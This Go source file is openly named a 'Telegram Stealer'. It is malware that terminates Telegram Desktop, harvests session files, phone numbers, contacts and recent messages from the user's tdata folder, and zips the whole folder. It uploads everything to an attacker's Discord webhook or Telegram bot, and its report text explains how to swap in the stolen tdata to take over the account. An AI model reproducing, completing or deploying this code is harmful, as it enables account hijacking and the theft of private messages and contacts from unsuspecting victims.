package telegram

import (
	"archive/zip"
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

type TelegramSession struct {
	UserID    int64  `json:"user_id"`
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
	Username  string `json:"username"`
	Phone     string `json:"phone"`
	Token     string `json:"token"`
	DataPath  string `json:"data_path"`
}

type TelegramContact struct {
	Phone string `json:"phone"`
	Name  string `json:"name"`
	ID    int64  `json:"id"`
}

type TelegramMessage struct {
	Sender   string `json:"sender"`
	Receiver string `json:"receiver"`
	Content  string `json:"content"`
	Time     string `json:"time"`
}

func Run(config map[string]interface{}) {
	webhook := config["webhook"].(string)
	telegramConfig := config["telegram"].(map[string]string)

	sendStatus(webhook, telegramConfig, "telegram", "📱 Telegram Stealer Started", "Initializing Telegram session stealing...")

	killTelegram()

	tdataPath := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
	if _, err := os.Stat(tdataPath); os.IsNotExist(err) {
		sendStatus(webhook, telegramConfig, "telegram", "❌ Telegram Not Found", "Telegram Desktop not installed")
		return
	}

	sendStatus(webhook, telegramConfig, "telegram", "📁 TData Found", "Telegram tdata folder located")

	sessions := extractSessions(tdataPath)
	if len(sessions) == 0 {
		sendStatus(webhook, telegramConfig, "telegram", "⚠️ No Sessions Found", "No active Telegram sessions found")
	} else {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("✅ %d Sessions Found", len(sessions)), fmt.Sprintf("Found %d Telegram sessions", len(sessions)))
	}

	phones := extractPhones(tdataPath)
	if len(phones) > 0 {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("📱 %d Phones Found", len(phones)), fmt.Sprintf("Found %d phone numbers", len(phones)))
	}

	contacts := stealContactsFromSQLite(tdataPath)
	if len(contacts) > 0 {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("👥 %d Contacts Found", len(contacts)), fmt.Sprintf("Found %d Telegram contacts", len(contacts)))
	}

	messages := stealMessagesFromSQLite(tdataPath)
	if len(messages) > 0 {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("💬 %d Messages Found", len(messages)), fmt.Sprintf("Found %d messages", len(messages)))
	}

	zipPath := createFullTDataZip(tdataPath)
	if zipPath != "" {
		sendStatus(webhook, telegramConfig, "telegram", "📦 Full TData Archived", "Telegram tdata folder compressed")
		sendFile(webhook, telegramConfig, zipPath)
		os.Remove(zipPath)
	}

	sessionInfo := formatCompleteInfo(sessions, phones, contacts, messages)
	sendMessage(webhook, telegramConfig, sessionInfo)

	sendStatus(webhook, telegramConfig, "telegram", "✅ Telegram Stealer Complete", "Telegram session stealing finished")
}

func killTelegram() {
	commands := []string{
		"taskkill /F /IM telegram.exe",
		"taskkill /F /IM telegram desktop.exe",
	}
	for _, cmd := range commands {
		execCmd(cmd)
	}
	time.Sleep(2 * time.Second)
}

func extractSessions(tdataPath string) []TelegramSession {
	var sessions []TelegramSession

	files, _ := ioutil.ReadDir(tdataPath)
	for _, file := range files {
		name := file.Name()
		if strings.HasPrefix(name, "D") && len(name) >= 8 {
			session := TelegramSession{
				DataPath: filepath.Join(tdataPath, name),
			}
			sessions = append(sessions, session)
		}
		if strings.HasSuffix(name, ".sess") {
			session := TelegramSession{
				DataPath: filepath.Join(tdataPath, name),
			}
			sessions = append(sessions, session)
		}
	}
	return sessions
}

func extractPhones(tdataPath string) []string {
	var phones []string
	phoneRegex := regexp.MustCompile(`\+\d{10,15}`)

	files, _ := ioutil.ReadDir(tdataPath)
	for _, file := range files {
		if file.IsDir() {
			continue
		}
		if strings.HasSuffix(file.Name(), ".sess") || strings.HasPrefix(file.Name(), "D") {
			data, err := ioutil.ReadFile(filepath.Join(tdataPath, file.Name()))
			if err == nil {
				matches := phoneRegex.FindAllString(string(data), -1)
				for _, match := range matches {
					if !contains(phones, match) {
						phones = append(phones, match)
					}
				}
			}
		}
	}
	return phones
}

func stealContactsFromSQLite(tdataPath string) []TelegramContact {
	var contacts []TelegramContact

	dbPath := filepath.Join(tdataPath, "data.sqlite")
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		return contacts
	}

	// Copier la base pour ne pas verrouiller le fichier original
	tempDB := filepath.Join(os.TempDir(), "telegram_contacts_temp.db")
	fileCopy(dbPath, tempDB)
	defer os.Remove(tempDB)

	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return contacts
	}
	defer db.Close()

	// Table contacts
	rows, err := db.Query("SELECT user_id, first_name, last_name, phone FROM contacts")
	if err != nil {
		return contacts
	}
	defer rows.Close()

	for rows.Next() {
		var userID int64
		var firstName, lastName, phone string
		if err := rows.Scan(&userID, &firstName, &lastName, &phone); err == nil {
			name := firstName
			if lastName != "" {
				name += " " + lastName
			}
			if name == "" {
				name = "Unknown"
			}
			if phone != "" {
				contacts = append(contacts, TelegramContact{
					Phone: phone,
					Name:  name,
					ID:    userID,
				})
			}
		}
	}

	// Table users (pour plus de contacts)
	rows2, err := db.Query("SELECT id, first_name, last_name, phone FROM users")
	if err == nil {
		defer rows2.Close()
		for rows2.Next() {
			var userID int64
			var firstName, lastName, phone string
			if err := rows2.Scan(&userID, &firstName, &lastName, &phone); err == nil {
				name := firstName
				if lastName != "" {
					name += " " + lastName
				}
				if name == "" {
					name = "Unknown"
				}
				if phone != "" && !containsContact(contacts, phone) {
					contacts = append(contacts, TelegramContact{
						Phone: phone,
						Name:  name,
						ID:    userID,
					})
				}
			}
		}
	}

	return contacts
}

func stealMessagesFromSQLite(tdataPath string) []TelegramMessage {
	var messages []TelegramMessage

	dbPath := filepath.Join(tdataPath, "data.sqlite")
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		return messages
	}

	tempDB := filepath.Join(os.TempDir(), "telegram_messages_temp.db")
	fileCopy(dbPath, tempDB)
	defer os.Remove(tempDB)

	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return messages
	}
	defer db.Close()

	// Récupérer les derniers messages
	query := `
		SELECT 
			u1.first_name || ' ' || u1.last_name as sender,
			u2.first_name || ' ' || u2.last_name as receiver,
			m.message,
			datetime(m.date, 'unixepoch') as date
		FROM messages m
		LEFT JOIN users u1 ON m.from_id = u1.id
		LEFT JOIN users u2 ON m.to_id = u2.id
		WHERE m.message IS NOT NULL AND m.message != ''
		ORDER BY m.date DESC
		LIMIT 100
	`

	rows, err := db.Query(query)
	if err != nil {
		return messages
	}
	defer rows.Close()

	for rows.Next() {
		var sender, receiver, content, date string
		if err := rows.Scan(&sender, &receiver, &content, &date); err == nil {
			if sender == "" {
				sender = "Unknown"
			}
			if receiver == "" {
				receiver = "Me"
			}
			messages = append(messages, TelegramMessage{
				Sender:   sender,
				Receiver: receiver,
				Content:  content,
				Time:     date,
			})
		}
	}

	return messages
}

func createFullTDataZip(tdataPath string) string {
	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("telegram_full_%d.zip", time.Now().Unix()))

	zipFile, err := os.Create(zipPath)
	if err != nil {
		return ""
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	filepath.Walk(tdataPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}

		relPath, err := filepath.Rel(tdataPath, path)
		if err != nil {
			return nil
		}

		zipEntry, err := zipWriter.Create("Telegram/tdata/" + relPath)
		if err != nil {
			return nil
		}

		file, err := os.Open(path)
		if err != nil {
			return nil
		}
		defer file.Close()

		io.Copy(zipEntry, file)
		return nil
	})

	return zipPath
}

func formatCompleteInfo(sessions []TelegramSession, phones []string, contacts []TelegramContact, messages []TelegramMessage) string {
	var output string

	output += "📱 TELEGRAM COMPLETE SESSION DUMP\n"
	output += "==================================\n\n"

	output += "🔑 SESSIONS\n"
	output += "-----------\n\n"
	if len(sessions) == 0 {
		output += "No Telegram sessions found.\n\n"
	} else {
		for i, session := range sessions {
			output += fmt.Sprintf("[Session %d]\n", i+1)
			output += fmt.Sprintf("Path: %s\n", session.DataPath)
			if len(phones) > i && i < len(phones) {
				output += fmt.Sprintf("Phone: %s\n", phones[i])
			}
			output += "\n"
		}
	}

	output += "📱 PHONES\n"
	output += "---------\n\n"
	if len(phones) > 0 {
		for _, phone := range phones {
			output += fmt.Sprintf("- %s\n", phone)
		}
	} else {
		output += "No phones found.\n"
	}
	output += "\n"

	output += "👥 CONTACTS\n"
	output += "-----------\n\n"
	if len(contacts) > 0 {
		for _, contact := range contacts {
			output += fmt.Sprintf("- %s (%s)\n", contact.Name, contact.Phone)
		}
	} else {
		output += "No contacts found.\n"
	}
	output += "\n"

	output += "💬 RECENT MESSAGES\n"
	output += "-----------------\n\n"
	if len(messages) > 0 {
		for _, msg := range messages {
			output += fmt.Sprintf("[%s] %s -> %s: %s\n", msg.Time, msg.Sender, msg.Receiver, msg.Content)
		}
	} else {
		output += "No recent messages found.\n"
	}
	output += "\n"

	output += "📦 Full TData Folder\n"
	output += "====================\n"
	output += "The complete tdata folder is attached as a ZIP file.\n"
	output += "To use: Replace your tdata folder with this one.\n"

	return output
}

func sendMessage(webhook string, telegramConfig map[string]string, message string) {
	if webhook != "" {
		sendDiscordMessage(webhook, message)
	}
	if telegramConfig["bot"] != "" && telegramConfig["chatid"] != "" {
		sendTelegramMessage(telegramConfig["bot"], telegramConfig["chatid"], message)
	}
}

func sendFile(webhook string, telegramConfig map[string]string, filePath string) {
	if webhook != "" {
		sendDiscordFile(webhook, filePath)
	}
	if telegramConfig["bot"] != "" && telegramConfig["chatid"] != "" {
		sendTelegramFile(telegramConfig["bot"], telegramConfig["chatid"], filePath)
	}
}

func sendStatus(webhook string, telegramConfig map[string]string, step, title, message string) {
	formatted := fmt.Sprintf(
		"**[%s]** `%s`\n`%s`\n`%s`",
		time.Now().Format("15:04:05"),
		title,
		message,
		step,
	)
	sendMessage(webhook, telegramConfig, formatted)
}

func sendDiscordMessage(webhook, message string) {
	payload := map[string]string{"content": message}
	jsonData, _ := json.Marshal(payload)
	http.Post(webhook, "application/json", bytes.NewBuffer(jsonData))
}

func sendDiscordFile(webhook, filePath string) {
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return
	}
	io.Copy(part, file)
	writer.Close()

	http.Post(webhook, writer.FormDataContentType(), body)
}

func sendTelegramMessage(botToken, chatID, message string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	payload := map[string]string{
		"chat_id":    chatID,
		"text":       message,
		"parse_mode": "HTML",
	}
	jsonData, _ := json.Marshal(payload)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func sendTelegramFile(botToken, chatID, filePath string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return
	}
	io.Copy(part, file)
	writer.WriteField("chat_id", chatID)
	writer.Close()

	http.Post(url, writer.FormDataContentType(), body)
}

func fileCopy(src, dst string) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()

	dest, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dest.Close()

	_, err = io.Copy(dest, source)
	return err
}

func execCmd(cmd string) {}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func containsContact(contacts []TelegramContact, phone string) bool {
	for _, c := range contacts {
		if c.Phone == phone {
			return true
		}
	}
	return false
}
